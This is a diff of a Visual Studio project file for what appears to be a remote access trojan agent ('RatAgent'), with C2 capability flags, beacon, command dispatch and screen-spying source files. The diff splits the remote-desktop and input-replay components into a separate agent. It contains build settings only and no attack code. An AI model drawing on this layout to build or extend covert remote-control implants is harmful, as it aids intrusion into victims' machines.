@@ -52,7 +52,7 @@
     <!-- 模块标识（见 core/module_id.h）：决定命名空间与 C2 侧标签/能力位。
          新模块工程应把这两个值**写死成自己的**，别依赖默认值（默认是 full）。 -->
     <RatAgentModuleId Condition="'$(RatAgentModuleId)' == ''">full</RatAgentModuleId>
-    <RatAgentModuleCaps Condition="'$(RatAgentModuleCaps)' == ''">(c2::kCapSys | c2::kCapRemote)</RatAgentModuleCaps>
+    <RatAgentModuleCaps Condition="'$(RatAgentModuleCaps)' == ''">(c2::kCapSys)</RatAgentModuleCaps>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
@@ -67,7 +67,7 @@
     <Link>
       <SubSystem>Console</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;windowscodecs.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
@@ -88,7 +88,7 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;windowscodecs.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
@@ -96,20 +96,16 @@
     <ClCompile Include="caps_full.cpp" />
     <ClCompile Include="core\agent_runtime.cpp" />
     <ClCompile Include="core\capability.cpp" />
-    <ClCompile Include="core\screen_module.cpp" />
     <ClCompile Include="core\protocol.cpp" />
     <ClCompile Include="core\crypto.cpp" />
     <ClCompile Include="core\net.cpp" />
     <ClCompile Include="core\session.cpp" />
     <ClCompile Include="core\cmd_dispatch.cpp" />
     <ClCompile Include="core\beacon.cpp" />
-    <ClCompile Include="core\screen_stream.cpp" />
-    <ClCompile Include="core\screen_spy.cpp" />
-    <ClCompile Include="core\desktop_switch.cpp" />
-    <ClCompile Include="core\input_replay.cpp" />
+    <!-- 远程桌面整组（screen_spy/screen_stream/input_replay/desktop_switch）已拆到
+         client/agents/screen/ 成为独立 agent（模块化阶段 2） -->
     <ClInclude Include="core\module_id.h" />
     <ClInclude Include="core\capability.h" />
-    <ClInclude Include="core\screen_module.h" />
     <ClInclude Include="core\agent_debug.h" />
     <ClInclude Include="core\protocol.h" />
     <ClInclude Include="core\agent_runtime.h" />
